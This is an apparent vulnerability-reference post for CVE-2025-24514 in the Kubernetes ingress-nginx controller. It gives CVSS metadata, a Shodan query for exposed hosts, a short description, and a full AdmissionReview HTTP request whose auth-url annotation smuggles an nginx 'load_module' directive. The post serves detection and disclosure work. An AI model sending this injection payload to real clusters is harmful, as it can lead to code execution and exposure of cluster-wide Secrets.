---
layout: post
cve_id: CVE-2025-24514
title: Ingress-Nginx Controller - Configuration Injection via Unsanitized `auth-url`
  Annotation
pcap: true
pcap_path: /pcaps/2025/CVE-2025-24514.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2025/CVE-2025-24514.yaml
snort2_rule: N/A
snort3_rule: N/A
author: iamnoooob,rootxharsh,pdresearch
severity: high
impact: 'Authenticated users with Ingress creation permissions can inject nginx configuration
  through the auth-url annotation, leading to arbitrary code execution in the ingress-nginx
  controller context and disclosure of all Kubernetes Secrets cluster-wide.

  '
remediation: 'Upgrade to the patched version of ingress-nginx that properly sanitizes
  the auth-url annotation.

  '
reference:
- https://github.com/kubernetes/kubernetes/issues/131006
- https://www.wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities
- https://nvd.nist.gov/vuln/detail/CVE-2025-24514
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 8.8
  cve-id: CVE-2025-24514
  cwe-id: CWE-20
  epss-score: 0.44989
  epss-percentile: 0.9747
metadata:
  verified: true
  max-request: 1
  shodan-query: ssl:"ingress-nginx" port:8443
tags:
- cve
- cve2025
- cloud
- devops
- kubernetes
- ingress
- nginx
- k8s
- vuln
---

## üîç Vulnerability Description
A security issue was discovered in  ingress-nginx https-//github.com/kubernetes/ingress-nginx  where the `auth-url` Ingress annotation can be used to inject configuration into nginx. This can lead to arbitrary code execution in the context of the ingress-nginx controller, and disclosure of Secrets accessible to the controller. (Note that in the default installation, the controller can access all Secrets cluster-wide.)


## üåê HTTP Request
```nohighlight
POST / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
Connection: close
Content-Length: 1572
Content-Type: application/json
Accept-Encoding: gzip

{
  "kind": "AdmissionReview",
  "apiVersion": "admission.k8s.io/v1",
  "request": {
    "uid": "d48aa397-c414-4fb2-a2b0-b28187daf8a6",
    "kind": {
      "group": "networking.k8s.io",
      "version": "v1",
      "kind": "Ingress"
    },
    "resource": {
      "group": "networking.k8s.io",
      "version": "v1",
      "resource": "ingresses"
    },
    "requestKind": {
      "group": "networking.k8s.io",
      "version": "v1",
      "kind": "Ingress"
    },
    "requestResource": {
      "group": "networking.k8s.io",
      "version": "v1",
      "resource": "ingresses"
    },
    "name": "test-38BD5LjkuhOihI1awFbr05WJTNc",
    "namespace": "default",
    "operation": "CREATE",
    "userInfo": {

    },
    "object": {
      "kind": "Ingress",
      "apiVersion": "networking.k8s.io/v1",
      "metadata": {
        "name": "test-38BD5LjkuhOihI1awFbr05WJTNc",
        "namespace": "default",
        "creationTimestamp": null,
        "annotations": {
"nginx.ingress.kubernetes.io/auth-url": "http://example.com#;load_module test;\n"
        }
      },
      "spec": {
        "ingressClassName": "nginx",
        "rules": [
          {
            "host": "38BD5LjkuhOihI1awFbr05WJTNc",
            "http": {
              "paths": [
              ]
            }
          }
        ]
      },
      "status": {
        "loadBalancer": {}
      }
    },
    "oldObject": null,
    "dryRun": true,
    "options": {
      "kind": "CreateOptions",
      "apiVersion": "meta.k8s.io/v1"
    }
  }
}
```

